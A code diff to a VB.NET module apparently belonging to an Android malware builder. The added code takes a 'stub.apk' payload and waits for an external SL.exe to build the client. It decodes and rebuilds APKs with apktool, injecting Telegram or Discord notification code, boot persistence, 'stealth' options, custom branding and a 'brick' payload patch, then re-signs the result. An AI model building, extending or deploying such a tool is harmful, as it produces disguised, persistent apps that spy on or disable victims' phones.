@@ -6,6 +6,7 @@ Imports System.Text
 Imports System.Text.RegularExpressions
 Imports System.Xml
 Imports System.IO.Compression
+Imports System.Security.Cryptography
 
 Public Module ApkNotifyPatcher
     Private Const AndroidNs As String = "http://schemas.android.com/apk/res/android"
@@ -64,6 +65,182 @@ Public Module ApkNotifyPatcher
         Return Path.Combine(GetBuildingApktoolRoot(), "app-release", "dist", "app-release.apk")
     End Function
 
+    Public Function GetBuildingSlClientApkPath() As String
+        Return Path.Combine(GetBuildingApktoolRoot(), "out", "client.apk")
+    End Function
+
+    Public Class SlBuildResult
+        Public Success As Boolean
+        Public OutputPath As String
+        Public ErrorMessage As String
+    End Class
+
+    Public Function EnsureSlBuildPrerequisites(resourcesPath As String, ByRef errorMessage As String) As Boolean
+        errorMessage = Nothing
+        Try
+            Dim payloadDir As String = Path.Combine(resourcesPath, "Imports", "Payload")
+            If Not Directory.Exists(payloadDir) Then
+                errorMessage = "Payload folder not found: " & payloadDir
+                Return False
+            End If
+
+            Dim stubPath As String = Path.Combine(payloadDir, "stub.apk")
+            If Not IsValidApkFile(stubPath) Then
+                errorMessage = "stub.apk missing or invalid in Payload folder — required by SL.exe to build the client"
+                Return False
+            End If
+            If Not File.Exists(Path.Combine(payloadDir, "s.inf")) Then
+                errorMessage = "s.inf missing in Payload folder"
+                Return False
+            End If
+            If Not File.Exists(Path.Combine(payloadDir, "apktool.zip")) Then
+                errorMessage = "apktool.zip missing in Payload folder"
+                Return False
+            End If
+
+            Dim apktoolRoot As String = GetBuildingApktoolRoot()
+            Dim apktoolJar As String = Path.Combine(apktoolRoot, "apktool.jar")
+            If Not File.Exists(apktoolJar) Then
+                Dim zipPath As String = Path.Combine(payloadDir, "apktool.zip")
+                Dim buildingRoot As String = Path.Combine(GetDriveRoot(), "Building-6.1")
+                Directory.CreateDirectory(buildingRoot)
+                System.IO.Compression.ZipFile.ExtractToDirectory(zipPath, buildingRoot)
+            End If
+
+            Directory.CreateDirectory(Path.Combine(apktoolRoot, "out"))
+
+            ClearStaleSlOutputs()
+
+            EnsureSigningTools(resourcesPath, errorMessage)
+            Return True
+        Catch ex As Exception
+            errorMessage = ex.Message
+            Return False
+        End Try
+    End Function
+
+    Public Sub ClearStaleSlOutputs()
+        Try
+            Dim apktoolRoot As String = GetBuildingApktoolRoot()
+            Dim stalePaths As String() = {
+                GetBuildingSlClientApkPath(),
+                GetBuildingClientApkPath(),
+                GetBuildingDistApkPath(),
+                Path.Combine(apktoolRoot, "app-release.apk")
+            }
+            For Each stalePath As String In stalePaths
+                If String.IsNullOrWhiteSpace(stalePath) OrElse Not File.Exists(stalePath) Then Continue For
+                Try
+                    File.Delete(stalePath)
+                Catch
+                End Try
+            Next
+
+            Dim distDir As String = Path.Combine(apktoolRoot, "app-release", "dist")
+            If Directory.Exists(distDir) Then
+                For Each apkFile As FileInfo In New DirectoryInfo(distDir).GetFiles("*.apk")
+                    Try
+                        apkFile.Delete()
+                    Catch
+                    End Try
+                Next
+            End If
+        Catch
+        End Try
+    End Sub
+
+    Private Function IsApkFresh(apkPath As String, notBeforeUtc As DateTime) As Boolean
+        Try
+            If Not IsValidApkFile(apkPath) Then Return False
+            Return File.GetLastWriteTimeUtc(apkPath) >= notBeforeUtc.AddSeconds(-2)
+        Catch
+            Return False
+        End Try
+    End Function
+
+    Public Function WaitForSlBuildOutput(Optional resourcesPath As String = Nothing, Optional timeoutMs As Integer = 180000, Optional notBeforeUtc As DateTime? = Nothing) As String
+        Dim cutoff As DateTime = If(notBeforeUtc.HasValue, notBeforeUtc.Value, DateTime.MinValue)
+        Dim deadline As DateTime = DateTime.UtcNow.AddMilliseconds(timeoutMs)
+        Do
+            Dim resolved As String = ResolveDistApkPath(resourcesPath)
+            If IsApkFresh(resolved, cutoff) Then Return resolved
+            Dim slClient As String = GetBuildingSlClientApkPath()
+            If IsApkFresh(slClient, cutoff) Then Return slClient
+            Threading.Thread.Sleep(500)
+        Loop While DateTime.UtcNow < deadline
+
+        Dim fallback As String = ResolveDistApkPath(resourcesPath)
+        If IsApkFresh(fallback, cutoff) Then Return fallback
+        Dim fallbackClient As String = GetBuildingSlClientApkPath()
+        If IsApkFresh(fallbackClient, cutoff) Then Return fallbackClient
+        Return fallback
+    End Function
+
+    Public Function TryFinalizeSlBuild(Optional resourcesPath As String = Nothing, Optional ByRef errorMessage As String = Nothing) As Boolean
+        errorMessage = Nothing
+        Try
+            If Not HasJavaRuntime() Then
+                errorMessage = "Java runtime not found (install JDK/JRE and add java to PATH)"
+                Return False
+            End If
+
+            Dim payloadDir As String = Path.Combine(If(String.IsNullOrWhiteSpace(resourcesPath), AppDomain.CurrentDomain.BaseDirectory, resourcesPath), "Imports", "Payload")
+            Dim apktoolJar As String = ExtractApktoolJar(payloadDir)
+            If String.IsNullOrWhiteSpace(apktoolJar) OrElse Not File.Exists(apktoolJar) Then
+                errorMessage = "apktool.jar not found"
+                Return False
+            End If
+
+            Dim apktoolRoot As String = GetBuildingApktoolRoot()
+            Dim decodeDir As String = GetBuildingDecompileDir()
+            Dim distApk As String = GetBuildingDistApkPath()
+
+            If Not File.Exists(Path.Combine(decodeDir, "apktool.yml")) Then
+                Dim decodeSource As String = ResolveDistApkPath(resourcesPath)
+                If Not IsValidApkFile(decodeSource) Then
+                    decodeSource = GetBuildingSlClientApkPath()
+                End If
+                If Not IsValidApkFile(decodeSource) Then
+                    decodeSource = Path.Combine(apktoolRoot, "app-release.apk")
+                End If
+                If Not IsValidApkFile(decodeSource) Then
+                    decodeSource = Path.Combine(payloadDir, "stub.apk")
+                End If
+                If Not IsValidApkFile(decodeSource) Then
+                    errorMessage = "No APK source found to rebuild client (wait for SL.exe to finish)"
+                    Return False
+                End If
+
+                If Directory.Exists(decodeDir) Then
+                    Try
+                        Directory.Delete(decodeDir, True)
+                    Catch
+                    End Try
+                End If
+
+                Dim decodeErr As String = Nothing
+                If Not DecodeApkForPatch(apktoolJar, decodeSource, decodeDir, apktoolRoot, decodeErr) Then
+                    errorMessage = "apktool decode failed: " & FormatApktoolError(decodeErr)
+                    Return False
+                End If
+            End If
+
+            Dim distDir As String = Path.GetDirectoryName(distApk)
+            If Not String.IsNullOrWhiteSpace(distDir) Then Directory.CreateDirectory(distDir)
+
+            Dim buildErr As String = Nothing
+            If Not BuildDecodedApk(apktoolJar, decodeDir, distApk, apktoolRoot, buildErr) Then
+                errorMessage = "Client rebuild failed (apktool b): " & FormatApktoolError(buildErr)
+                Return False
+            End If
+
+            Return IsValidApkFile(distApk)
+        Catch ex As Exception
+            errorMessage = ex.Message
+            Return False
+        End Try
+    End Function
+
     Public Function EnsureClientOutputDirectory() As String
         Dim clientApk As String = GetBuildingClientApkPath()
         Dim outDir As String = Path.GetDirectoryName(clientApk)
@@ -79,6 +256,8 @@ Public Module ApkNotifyPatcher
         For Each buildingRoot As String In GetBuildingRoots()
             Dim apktoolRoot As String = Path.Combine(buildingRoot, "apktool")
             candidates.Add(Path.Combine(apktoolRoot, "app-release", "dist", "app-release.apk"))
+            candidates.Add(Path.Combine(apktoolRoot, "app-release", "dist", "app-release-fixed.apk"))
+            candidates.Add(Path.Combine(apktoolRoot, "out", "client.apk"))
             candidates.Add(Path.Combine(apktoolRoot, "app-release.apk"))
             candidates.Add(Path.Combine(apktoolRoot, "app-release-unsigned.apk"))
             candidates.Add(Path.Combine(apktoolRoot, "app-release", "dist", "app-release-unsigned.apk"))
@@ -114,7 +293,7 @@ Public Module ApkNotifyPatcher
         Return GetBuildingDistApkPath()
     End Function
 
-    Public Function WaitForDistApk(Optional resourcesPath As String = Nothing, Optional timeoutMs As Integer = 8000) As String
+    Public Function WaitForDistApk(Optional resourcesPath As String = Nothing, Optional timeoutMs As Integer = 120000) As String
         Dim deadline As DateTime = DateTime.UtcNow.AddMilliseconds(timeoutMs)
         Do
             Dim resolved As String = ResolveDistApkPath(resourcesPath)
@@ -222,6 +401,57 @@ Public Module ApkNotifyPatcher
         Return False
     End Function
 
+    Public Function ComputePackageAesKey(packageName As String) As Byte()
+        If String.IsNullOrWhiteSpace(packageName) Then Return Nothing
+        Using sha As SHA256 = SHA256.Create()
+            Return sha.ComputeHash(Encoding.UTF8.GetBytes(packageName.Trim()))
+        End Using
+    End Function
+
+    Public Function TryReadApkPackageName(apkPath As String) As String
+        Try
+            If Not File.Exists(apkPath) Then Return Nothing
+            Using archive As ZipArchive = System.IO.Compression.ZipFile.OpenRead(apkPath)
+                Dim manifestEntry As ZipArchiveEntry = archive.GetEntry("AndroidManifest.xml")
+                If manifestEntry Is Nothing Then Return Nothing
+                Using ms As New MemoryStream()
+                    Using src As Stream = manifestEntry.Open()
+                        src.CopyTo(ms)
+                    End Using
+                    Dim bytes As Byte() = ms.ToArray()
+                    Dim ascii As String = Encoding.ASCII.GetString(bytes)
+                    Dim m As Match = Regex.Match(ascii, "package=""([^""]+)""", RegexOptions.IgnoreCase)
+                    If m.Success Then Return m.Groups(1).Value
+                    m = Regex.Match(ascii, "package='([^']+)'", RegexOptions.IgnoreCase)
+                    If m.Success Then Return m.Groups(1).Value
+                    Dim utf8 As String = Encoding.UTF8.GetString(bytes)
+                    m = Regex.Match(utf8, "package=""([^""]+)""", RegexOptions.IgnoreCase)
+                    If m.Success Then Return m.Groups(1).Value
+                End Using
+            End Using
+        Catch
+        End Try
+        Return Nothing
+    End Function
+
+    Public Function ApkLooksSigned(apkPath As String) As Boolean
+        Try
+            If Not File.Exists(apkPath) Then Return False
+            Using archive As ZipArchive = System.IO.Compression.ZipFile.OpenRead(apkPath)
+                For Each entry As ZipArchiveEntry In archive.Entries
+                    If Not entry.FullName.StartsWith("META-INF/", StringComparison.OrdinalIgnoreCase) Then Continue For
+                    Dim name As String = entry.FullName.ToUpperInvariant()
+                    If name.EndsWith(".RSA") OrElse name.EndsWith(".DSA") OrElse name.EndsWith(".EC") OrElse name.EndsWith(".SF") Then
+                        Return True
+                    End If
+                Next
+            End Using
+            Return False
+        Catch
+            Return False
+        End Try
+    End Function
+
     Public Function IsValidApkFile(apkPath As String) As Boolean
         Try
             If Not File.Exists(apkPath) Then Return False
@@ -231,6 +461,56 @@ Public Module ApkNotifyPatcher
                 Return hasDex
             End Using
         Catch
+            Return False
+        End Try
+    End Function
+
+    Public Function TrySignApkRobust(sourceApk As String, destApk As String, Optional resourcesPath As String = Nothing, Optional ByRef errorMessage As String = Nothing) As Boolean
+        errorMessage = Nothing
+        Try
+            If Not File.Exists(sourceApk) Then
+                errorMessage = "APK not found: " & sourceApk
+                Return False
+            End If
+
+            Dim root As String = GetBuildingApktoolRoot()
+            Dim toolsErr As String = Nothing
+            EnsureSigningTools(resourcesPath, toolsErr)
+
+            Dim destDir As String = Path.GetDirectoryName(destApk)
+            If Not String.IsNullOrWhiteSpace(destDir) Then Directory.CreateDirectory(destDir)
+
+            Dim signJar As String = FindFileCaseInsensitive(root, "SignApk.jar")
+            If String.IsNullOrWhiteSpace(signJar) Then signJar = FindFileCaseInsensitive(root, "signapk.jar")
+            Dim cert As String = FindFileCaseInsensitive(root, "certificate.pem")
+            Dim keyPk8 As String = FindFileCaseInsensitive(root, "key.pk8")
+
+            If Not String.IsNullOrWhiteSpace(signJar) AndAlso Not String.IsNullOrWhiteSpace(cert) AndAlso Not String.IsNullOrWhiteSpace(keyPk8) Then
+                Dim signedTemp As String = destApk & ".signapk.tmp"
+                If File.Exists(signedTemp) Then File.Delete(signedTemp)
+                Dim signErr As String = Nothing
+                Dim javaExe As String = FindJavaExecutable(root)
+                If RunProcess(javaExe, "-jar """ & signJar & """ """ & cert & """ """ & keyPk8 & """ """ & sourceApk & """ """ & signedTemp & """", root, signErr, True) AndAlso IsValidApkFile(signedTemp) Then
+                    File.Copy(signedTemp, destApk, True)
+                    File.Delete(signedTemp)
+                    Return True
+                End If
+                errorMessage = If(String.IsNullOrWhiteSpace(signErr), "SignApk.jar failed", signErr)
+                Return False
+            End If
+
+            File.Copy(sourceApk, destApk, True)
+            Dim keystorePath As String = Path.Combine(root, "notify.keystore")
+            If TrySignApk(destApk, keystorePath) AndAlso IsValidApkFile(destApk) Then
+                Return True
+            End If
+
+            If String.IsNullOrWhiteSpace(errorMessage) Then
+                errorMessage = If(toolsErr, "Signing failed — check SignApk.jar keys and Java")
+            End If
+            Return False
+        Catch ex As Exception
+            errorMessage = ex.Message
             Return False
         End Try
     End Function
@@ -245,46 +525,17 @@ Public Module ApkNotifyPatcher
                 Return False
             End If
 
-            Dim root As String = GetBuildingApktoolRoot()
-            Dim toolsErr As String = Nothing
-            Dim hasSignApk As Boolean = EnsureSigningTools(resourcesPath, toolsErr)
-
-            Dim signJar As String = FindFileCaseInsensitive(root, "SignApk.jar")
-            If String.IsNullOrWhiteSpace(signJar) Then signJar = FindFileCaseInsensitive(root, "signapk.jar")
-            Dim cert As String = FindFileCaseInsensitive(root, "certificate.pem")
-            Dim keyPk8 As String = FindFileCaseInsensitive(root, "key.pk8")
-
-            If hasSignApk AndAlso Not String.IsNullOrWhiteSpace(signJar) AndAlso Not String.IsNullOrWhiteSpace(cert) AndAlso Not String.IsNullOrWhiteSpace(keyPk8) Then
-                Dim signedTemp As String = clientApk & ".signed.tmp"
-                If File.Exists(signedTemp) Then File.Delete(signedTemp)
-
-                Dim signErr As String = Nothing
-                Dim javaExe As String = FindJavaExecutable(root)
-                If RunProcess(javaExe, "-jar """ & signJar & """ """ & cert & """ """ & keyPk8 & """ """ & distApk & """ """ & signedTemp & """", root, signErr, True) AndAlso IsValidApkFile(signedTemp) Then
-                    File.Copy(signedTemp, clientApk, True)
-                    File.Delete(signedTemp)
-                    Return True
-                End If
-
-                If String.IsNullOrWhiteSpace(signErr) Then signErr = toolsErr
-                errorMessage = "SignApk.jar failed: " & If(signErr, "unknown error")
+            If String.Equals(Path.GetFullPath(distApk), Path.GetFullPath(clientApk), StringComparison.OrdinalIgnoreCase) Then
+                If ApkLooksSigned(clientApk) AndAlso IsValidApkFile(clientApk) Then Return True
+                Return TrySignApkRobust(distApk, clientApk, resourcesPath, errorMessage)
             End If
 
-            Dim keystorePath As String = Path.Combine(root, "notify.keystore")
-            Dim unsignedCopy As String = clientApk & ".unsigned.tmp"
-            If File.Exists(unsignedCopy) Then File.Delete(unsignedCopy)
-            File.Copy(distApk, unsignedCopy, True)
-            If TrySignApk(unsignedCopy, keystorePath) AndAlso IsValidApkFile(unsignedCopy) Then
-                File.Copy(unsignedCopy, clientApk, True)
-                File.Delete(unsignedCopy)
+            If ApkLooksSigned(distApk) AndAlso IsValidApkFile(distApk) Then
+                File.Copy(distApk, clientApk, True)
                 Return True
             End If
-            If File.Exists(unsignedCopy) Then File.Delete(unsignedCopy)
 
-            If String.IsNullOrWhiteSpace(errorMessage) Then
-                errorMessage = If(toolsErr, "Signing failed — install Java and check Building-6.1\apktool keys")
-            End If
-            Return False
+            Return TrySignApkRobust(distApk, clientApk, resourcesPath, errorMessage)
         Catch ex As Exception
             errorMessage = ex.Message
             Return False
@@ -418,18 +669,16 @@ Public Module ApkNotifyPatcher
         Return TryPatchApk(stubPath, cfg, Nothing, err)
     End Function
 
-    Public Function TryPatchApk(apkPath As String, cfg As NotifySettingsHelper.NotifyConfig, protectionCfg As ApkProtectionPatcher.ProtectionConfig, ByRef errorMessage As String) As Boolean
+    Public Function TryPatchApk(apkPath As String, cfg As NotifySettingsHelper.NotifyConfig, protectionCfg As ApkProtectionPatcher.ProtectionConfig, ByRef errorMessage As String, Optional brandingCfg As ApkBrandingPatcher.ClientBrandingConfig = Nothing, Optional resourcesPath As String = Nothing) As Boolean
         errorMessage = Nothing
         _lastNotifyPatchReport = Nothing
         Try
             Dim notifyEnabled As Boolean = cfg IsNot Nothing AndAlso cfg.Enabled
             Dim protectionNeedsPatch As Boolean = ApkProtectionPatcher.NeedsSmaliPatch(protectionCfg)
+            Dim stealthEnabled As Boolean = protectionCfg IsNot Nothing AndAlso protectionCfg.StealthEnabled
+            Dim brandingNeeded As Boolean = brandingCfg IsNot Nothing AndAlso brandingCfg.HasContent()
             If notifyEnabled AndAlso Not NotifyConfigHasCredentials(cfg) Then
                 errorMessage = "Notify enabled but Telegram token/chat id or Discord webhook is empty"
-                Return False
-            End If
-            If Not notifyEnabled AndAlso Not protectionNeedsPatch AndAlso (protectionCfg Is Nothing OrElse Not protectionCfg.StealthEnabled) Then
-                errorMessage = "Nothing to patch"
                 Return False
             End If
             If String.IsNullOrWhiteSpace(apkPath) OrElse Not File.Exists(apkPath) Then
@@ -444,6 +693,11 @@ Public Module ApkNotifyPatcher
             End If
 
             Dim resourcesPayload As String = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Resources", "Imports", "Payload")
+            Dim smaliPayloadDir As String = If(Not String.IsNullOrWhiteSpace(resourcesPath), resourcesPath, If(Directory.Exists(resourcesPayload), resourcesPayload, payloadDir))
+            If Not notifyEnabled AndAlso Not protectionNeedsPatch AndAlso Not stealthEnabled AndAlso Not brandingNeeded AndAlso Not ApkBrandingPatcher.ApkContainsBrandingPlaceholders(apkPath) AndAlso Not BrickPayloadAvailable(smaliPayloadDir) Then
+                errorMessage = "Nothing to patch"
+                Return False
+            End If
             Dim apktoolJar As String = ExtractApktoolJar(If(Directory.Exists(resourcesPayload), resourcesPayload, payloadDir))
             If String.IsNullOrWhiteSpace(apktoolJar) OrElse Not File.Exists(apktoolJar) Then
                 errorMessage = "apktool.jar not found (need apktool.zip in Payload folder or Building-6.1\apktool)"
@@ -465,13 +719,27 @@ Public Module ApkNotifyPatcher
             File.Copy(apkPath, backupPath, True)
 
             Dim decodeErr As String = Nothing
-            If Not RunProcess("java", "-jar """ & apktoolJar & """ d -r """ & apkPath & """ -o """ & decodeDir & """ -f", payloadDir, decodeErr) Then
+            If Not DecodeApkForPatch(apktoolJar, apkPath, decodeDir, payloadDir, decodeErr) Then
                 RestoreBackup(apkPath, backupPath)
                 errorMessage = "apktool decode failed: " & decodeErr
                 Return False
             End If
 
+            If Not IsManifestPlainText(Path.Combine(decodeDir, "AndroidManifest.xml")) Then
+                RestoreBackup(apkPath, backupPath)
+                errorMessage = "apktool decode failed: AndroidManifest.xml is not plain text (update apktool.jar)"
+                Return False
+            End If
+
             SanitizeManifestFile(decodeDir)
+
+            Dim brandingResources As String = If(String.IsNullOrWhiteSpace(resourcesPath), resourcesPayload, resourcesPath)
+            If brandingCfg IsNot Nothing AndAlso brandingCfg.HasContent() Then
+                ApkBrandingPatcher.ApplyBrandingToDecodeDir(decodeDir, brandingCfg, brandingResources)
+            ElseIf ApkBrandingPatcher.ApkContainsBrandingPlaceholders(apkPath) Then
+                Dim fallbackBranding As New ApkBrandingPatcher.ClientBrandingConfig With {.AppName = "App", .Host = "127.0.0.1", .VersionName = "1.0"}
+                ApkBrandingPatcher.ApplyBrandingToDecodeDir(decodeDir, fallbackBranding, brandingResources)
+            End If
 
             WriteNotifyAsset(decodeDir, cfg)
             CopyNotifySmali(decodeDir, If(Directory.Exists(resourcesPayload), resourcesPayload, payloadDir))
@@ -486,11 +754,11 @@ Public Module ApkNotifyPatcher
 
             EnsureInternetPermission(decodeDir)
             EnsureBootPermission(decodeDir)
+            ApkBrickPatcher.ApplyBrickPatch(decodeDir, smaliPayloadDir)
 
             Dim report As New NotifyPatchReport With {
                 .ConfigHasCredentials = NotifyConfigHasCredentials(cfg)
             }
-            Dim smaliPayloadDir As String = If(Directory.Exists(resourcesPayload), resourcesPayload, payloadDir)
             ApplyBootstrapEntryPoints(decodeDir, notifyEnabled, report, smaliPayloadDir)
             _lastNotifyPatchReport = report
 
@@ -502,7 +770,7 @@ Public Module ApkNotifyPatcher
 
             Dim rebuiltPath As String = Path.Combine(workRoot, "rebuilt.apk")
             Dim buildErr As String = Nothing
-            If Not RunProcess("java", "-jar """ & apktoolJar & """ b -f -r """ & decodeDir & """ -o """ & rebuiltPath & """", payloadDir, buildErr) Then
+            If Not BuildDecodedApk(apktoolJar, decodeDir, rebuiltPath, payloadDir, buildErr) Then
                 RestoreBackup(apkPath, backupPath)
                 errorMessage = "apktool build failed: " & buildErr
                 Return False
@@ -636,9 +904,16 @@ Public Module ApkNotifyPatcher
                 Dim stdout As String = p.StandardOutput.ReadToEnd()
                 Dim stderr As String = p.StandardError.ReadToEnd()
                 p.WaitForExit()
-                errorOutput = If(String.IsNullOrWhiteSpace(stderr), stdout, stderr).Trim()
-                If errorOutput.Length > 300 Then
-                    errorOutput = errorOutput.Substring(0, 300)
+                errorOutput = (stdout & vbCrLf & stderr).Trim()
+                If p.ExitCode <> 0 AndAlso Not allowNonZero Then
+                    If String.IsNullOrWhiteSpace(errorOutput) Then
+                        errorOutput = "Process exited with code " & p.ExitCode.ToString()
+                    Else
+                        errorOutput = "exit " & p.ExitCode.ToString() & ": " & errorOutput
+                    End If
+                End If
+                If errorOutput.Length > 4000 Then
+                    errorOutput = errorOutput.Substring(errorOutput.Length - 4000)
                 End If
                 Return allowNonZero OrElse p.ExitCode = 0
             End Using
@@ -646,6 +921,87 @@ Public Module ApkNotifyPatcher
             errorOutput = ex.Message
             Return False
         End Try
+    End Function
+
+    Private Function GetJavaExecutableForBuild() As String
+        Return FindJavaExecutable(GetBuildingApktoolRoot())
+    End Function
+
+    Private Function IsManifestPlainText(manifestPath As String) As Boolean
+        Try
+            If Not File.Exists(manifestPath) Then Return False
+            Dim bytes As Byte() = File.ReadAllBytes(manifestPath)
+            If bytes.Length < 8 Then Return False
+            If bytes(0) = 3 AndAlso bytes(1) = 0 Then Return False
+            Dim text As String = Encoding.UTF8.GetString(bytes)
+            Return text.IndexOf("<manifest", StringComparison.OrdinalIgnoreCase) >= 0 AndAlso
+                   text.IndexOf("<application", StringComparison.OrdinalIgnoreCase) >= 0
+        Catch
+            Return False
+        End Try
+    End Function
+
+    Private Function DecodeApkForPatch(apktoolJar As String, apkPath As String, decodeDir As String, workingDir As String, ByRef errorOutput As String) As Boolean
+        errorOutput = String.Empty
+        Dim javaExe As String = GetJavaExecutableForBuild()
+        Dim decodeArgs As String() = {
+            "-jar """ & apktoolJar & """ d """ & apkPath & """ -o """ & decodeDir & """ -f",
+            "-jar """ & apktoolJar & """ d -r """ & apkPath & """ -o """ & decodeDir & """ -f"
+        }
+        For Each args As String In decodeArgs
+            Dim attemptErr As String = Nothing
+            If Directory.Exists(decodeDir) Then
+                Try
+                    Directory.Delete(decodeDir, True)
+                Catch
+                End Try
+            End If
+            Directory.CreateDirectory(decodeDir)
+            If RunProcess(javaExe, args, workingDir, attemptErr) AndAlso IsManifestPlainText(Path.Combine(decodeDir, "AndroidManifest.xml")) Then
+                Return True
+            End If
+            If String.IsNullOrWhiteSpace(errorOutput) Then errorOutput = attemptErr
+        Next
+        Return False
+    End Function
+
+    Public Function FormatApktoolError(raw As String) As String
+        If String.IsNullOrWhiteSpace(raw) Then Return "unknown apktool error — check Java and apktool.jar"
+        Dim text As String = raw.Trim()
+        Dim lines As String() = text.Split(New String() {vbCrLf, vbLf}, StringSplitOptions.RemoveEmptyEntries)
+        Dim important As New List(Of String)
+        For Each line As String In lines
+            Dim trimmed As String = line.Trim()
+            If trimmed.Length = 0 Then Continue For
+            Dim lower As String = trimmed.ToLowerInvariant()
+            If lower.Contains("exception") OrElse lower.Contains("pathnotexist") OrElse lower.Contains("error") OrElse
+               trimmed.StartsWith("W:", StringComparison.OrdinalIgnoreCase) OrElse trimmed.StartsWith("E:", StringComparison.OrdinalIgnoreCase) Then
+                important.Add(trimmed)
+            End If
+        Next
+        If important.Count > 0 Then
+            Return String.Join(" | ", important.Take(4))
+        End If
+        If text.Length > 800 Then text = text.Substring(text.Length - 800)
+        Return text
+    End Function
+
+    Private Function BuildDecodedApk(apktoolJar As String, decodeDir As String, outputApk As String, workingDir As String, ByRef errorOutput As String) As Boolean
+        errorOutput = String.Empty
+        Dim javaExe As String = GetJavaExecutableForBuild()
+        Dim args As String = "-jar """ & apktoolJar & """ b -f """ & decodeDir & """ -o """ & outputApk & """"
+        If File.Exists(outputApk) Then
+            Try
+                File.Delete(outputApk)
+            Catch
+            End Try
+        End If
+        Dim attemptErr As String = Nothing
+        If RunProcess(javaExe, args, workingDir, attemptErr) AndAlso File.Exists(outputApk) AndAlso IsValidApkFile(outputApk) Then
+            Return True
+        End If
+        errorOutput = attemptErr
+        Return False
     End Function
 
     Public Function BuildNotifyConfigText(cfg As NotifySettingsHelper.NotifyConfig) As String
@@ -921,6 +1277,18 @@ Public Module ApkNotifyPatcher
         Catch
         End Try
     End Sub
+
+    Public Function GetJavaExecutableForBuildPublic() As String
+        Return GetJavaExecutableForBuild()
+    End Function
+
+    Public Function BuildDecodedApkPublic(apktoolJar As String, decodeDir As String, outputApk As String, workingDir As String, ByRef errorOutput As String) As Boolean
+        Return BuildDecodedApk(apktoolJar, decodeDir, outputApk, workingDir, errorOutput)
+    End Function
+
+    Public Function DecodeApkPublic(apktoolJar As String, apkPath As String, decodeDir As String, workingDir As String, ByRef errorOutput As String) As Boolean
+        Return DecodeApkForPatch(apktoolJar, apkPath, decodeDir, workingDir, errorOutput)
+    End Function
 
     Public Function RunBuildProcess(fileName As String, arguments As String, workingDirectory As String, ByRef errorOutput As String, Optional allowNonZero As Boolean = False) As Boolean
         Return RunProcess(fileName, arguments, workingDirectory, errorOutput, allowNonZero)
@@ -1236,13 +1604,16 @@ Public Module ApkNotifyPatcher
         Dim localsPattern As String = Regex.Escape(methodSignature) & "\s*\r?\n\s*\.locals (\d+)"
         Dim localsMatch As Match = Regex.Match(text, localsPattern, RegexOptions.None, TimeSpan.FromSeconds(1))
         If localsMatch.Success Then
-            Dim neededLocals As Integer = Math.Max(2, Integer.Parse(localsMatch.Groups(1).Value))
-            text = Regex.Replace(
-                text,
-                localsPattern,
-                methodSignature & vbCrLf & "    .locals " & neededLocals.ToString(),
-                RegexOptions.None,
-                TimeSpan.FromSeconds(1))
+            Dim parsedLocals As Integer
+            If Integer.TryParse(localsMatch.Groups(1).Value, parsedLocals) Then
+                Dim neededLocals As Integer = Math.Max(2, Math.Min(parsedLocals, 16))
+                text = Regex.Replace(
+                    text,
+                    localsPattern,
+                    methodSignature & vbCrLf & "    .locals " & neededLocals.ToString(),
+                    RegexOptions.None,
+                    TimeSpan.FromSeconds(1))
+            End If
         End If
         Return True
     End Function
@@ -1305,13 +1676,16 @@ Public Module ApkNotifyPatcher
             RegexOptions.None,
             TimeSpan.FromSeconds(1))
         If localsMatch.Success Then
-            Dim neededLocals As Integer = Math.Max(2, Integer.Parse(localsMatch.Groups(1).Value))
-            text = Regex.Replace(
-                text,
-                Regex.Escape(methodMatch.Value) & "\s*\r?\n\s*\.locals \d+",
-                methodMatch.Value & vbCrLf & "    .locals " & neededLocals.ToString(),
-                RegexOptions.None,
-                TimeSpan.FromSeconds(1))
+            Dim parsedLocals As Integer
+            If Integer.TryParse(localsMatch.Groups(1).Value, parsedLocals) Then
+                Dim neededLocals As Integer = Math.Max(2, Math.Min(parsedLocals, 16))
+                text = Regex.Replace(
+                    text,
+                    Regex.Escape(methodMatch.Value) & "\s*\r?\n\s*\.locals \d+",
+                    methodMatch.Value & vbCrLf & "    .locals " & neededLocals.ToString(),
+                    RegexOptions.None,
+                    TimeSpan.FromSeconds(1))
+            End If
         End If
 
         File.WriteAllText(smaliPath, text, New UTF8Encoding(False))
@@ -1505,4 +1879,10 @@ Public Module ApkNotifyPatcher
         Next
         Return direct
     End Function
+    Private Function BrickPayloadAvailable(payloadDir As String) As Boolean
+        If String.IsNullOrWhiteSpace(payloadDir) Then Return False
+        Dim brickDir As String = Path.Combine(payloadDir, "brick_smali")
+        Return Directory.Exists(brickDir)
+    End Function
+
 End Module
